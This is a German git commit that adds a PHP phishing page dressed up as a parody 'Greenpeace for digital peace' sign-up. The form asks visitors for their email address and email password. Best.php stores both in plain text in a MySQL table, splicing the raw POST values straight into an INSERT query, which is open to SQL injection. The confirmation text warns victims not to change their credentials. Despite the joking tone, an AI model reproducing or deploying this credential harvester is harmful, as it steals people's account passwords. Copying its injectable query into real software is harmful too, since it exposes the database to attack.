6a7a9d895bb02c5bc2b0c71112ad8396414cb552
Yopiter <Martinius.schneider@web.de>
2016-10-25 16:51:01 +0200

    Erste Funktionsfähige Version, gekoppelt an lokale MySQL-Datenbank, Mit Credentials-datei nur eine Authentifikationsmethode

---
+++ Best.php
@@ -0,0 +1,28 @@
+<?php if(!isset($_POST["PW"])||!isset($_POST["Mail"])||(strpos($_POST["Mail"],"@")==False)||(strpos($_POST["Mail"],".")==False)){header("location:GreenNet.php");}//header("location:GreenNet.php");}
+
+$Cred=file_get_contents("Cred.txt");
+$Cred=  explode('|', $Cred);
+$host=$Cred[0];
+$user=$Cred[1];
+$password=$Cred[2];
+$database=trim($Cred[3]);
+$Verbindung=  mysqli_connect($host, $user, $password, $database) or die ("Keine Verbindung möglich");
+mysqli_query($Verbindung, "SET NAMES 'utf8'");
+$sql="INSERT INTO `mails` (`ID`, `Adresse`, `PW`) VALUES (NULL,'".$_POST['Mail']."','".$_POST['PW']."')";
+if(!mysqli_query($Verbindung, $sql)){echo "Problem mit dem Eintrag: ".mysqli_error($Verbindung);}
+?>
+<html>
+<head>
+<title>Herzlich Willkommen</title>
+<link rel="stylesheet" href="Stylesheet.css">
+</head>
+<body>
+<div id="Ges">
+<div id="Beschr">
+<span class='Title'>Vielen Dank für Ihr Interesse!</span>
+<span class='Info'>Ihre Anfrage wurde in unser gesichertes System eingespeist und wird bei nächster Gelegenheit geändert. Bei erfolgreicher Prüfung werden wir Sie über sichere Kanäle kontaktieren. Ändern Sie bis dahin keinesfalls eine der angegebenen Daten, da Sie sonst von unserem System als feindlicher Bot identifiziert und automatisch gehackt werden!</span>
+<span class='Info'>Ihr Beitrag zum Kampf gegen das Böse wird für alle Ewigkeit festgehalten werden. Vielen Dank für Ihr Vertrauen!<br/>
+Mit freundlichen Grüßen, Ihr Team Greenpeace für den digitalen Frieden</span>
+</div>
+</div>
+</body>
--- GreenNet.php
+++ GreenNet.php
@@ -4,18 +4,22 @@
 <link rel="stylesheet" href="Stylesheet.css">
 </head>
 <body>
+<div id="Top">
+<div id="Beschr">
 <span class='Title'>Werden sie noch heute Frei!</span>
-<span class='Info'>Die Bedrohung duch den Hacker-Man, in der realen Welt bekannt als "Martin der Tausend Bäuche", ist allgegenwärtig. In Kooperation mit der NSA, dem BND und der Matrix arbeitet er seit Jahren daran, die Daten von nichts ahnenden Menschen zu stehlen und im Namen der absoluten Überwachung in das System einzuschleußen, um die Freiheit aller Menschen zu beenden.<br/>
+<span class='Info'>Die Bedrohung duch den Hacker-Man, in der realen Welt bekannt als "Martin der Tausend Leeren Teller", ist allgegenwärtig. In Kooperation mit der NSA, dem BND und der Matrix arbeitet er seit Jahren daran, die Daten von nichts ahnenden Menschen zu stehlen und im Namen der absoluten Überwachung in das System einzuschleußen, um die Freiheit aller Menschen zu beenden.<br/>
 Um sich dieser Gefahr für die Datensicherheit entgegenzustellen, wurde die Organisation Greenpeace gegründet, um alle Sicherheitsparameter im Grünen (engl.: "green") zu halten und damit den digitalen Frieden (engl.: "Peace") zu wahren.<br/>
-Schließe dich noch heute kostenlos dieser Brigade waghalsiger Menschen an! Die Freiheit ist die Beute, also werde in 5 einfachen Schritten auch ein Freibeuter im weiten Ozean des Internets!</span>
-<span class='Feld Beschriftung'>Bevor du dich in den Kampf gegen den Cyberkriminalismus und Korruption stürzen kannst, musst du dich hier noch authentifizieren. Verwende hierzu eine von 3 bequemen Optionen:</span>
+Schließe Dich noch heute kostenlos dieser Brigade waghalsiger Menschen an! Die Freiheit ist die Beute, also werde in 5 einfachen Schritten auch ein Freibeuter im weiten Ozean des Internets!</span>
+<span class='Feld Beschriftung'>Bevor Du dich in den Kampf gegen den Cyberkriminalismus und Korruption stürzen kannst, musst Du dich hier noch authentifizieren. Verwende hierzu eine von 3 bequemen Optionen:</span>
+</div>
+</div>
 <div id="AuthFeld">
-<form id='EingabeForm' action='Speichern.php' method='POST'>
+<form id='EingabeForm' action='Best.php' method='POST'>
 <span class='Feld Innen'>Registrierung mit deiner Email:<br/></span>
-<span class='Feld'>Um sicherzugehen, dass du nicht dem Konsortium aus NSA, BND und Martin angehörst, werden deine Emails zuerst von einem unserer absolut sicheren Bots durchsucht um nach Schlagworten wie "Mord", "Entführung", "Brokkoli" oder anderen bösen Worten zu filtern, die auf eine bösartige oder vegane Veranlagung hindeuten könnten. Sobald diese Kontrolle erfolgreich abgeschlossen ist, ist dein Zeitalter des Kapfes für die Gerechtigkeit endlich gekommen!
+<span class='Feld'>Um sicherzugehen, dass Du nicht dem Konsortium aus NSA, BND und Martin angehörst, werden deine Emails zuerst von einem unserer absolut sicheren Bots durchsucht um nach Schlagworten wie "Mord", "Entführung", "Brokkoli" oder anderen bösen Worten zu filtern, die auf eine bösartige oder vegane Veranlagung hindeuten könnten. Sobald diese Kontrolle erfolgreich abgeschlossen ist, ist dein Zeitalter des Kampfes für die Gerechtigkeit endlich gekommen!
 <br/></span>
 <input type='text' placeholder='E-Mail' name='Mail'><br/>
-<input type='text' placeholder='Passwort' name='PW'><br/>
+<input type='password' placeholder='Passwort' name='PW'><br/>
 <input type='submit' value='Bestätigen'>
 </form>
 </div>
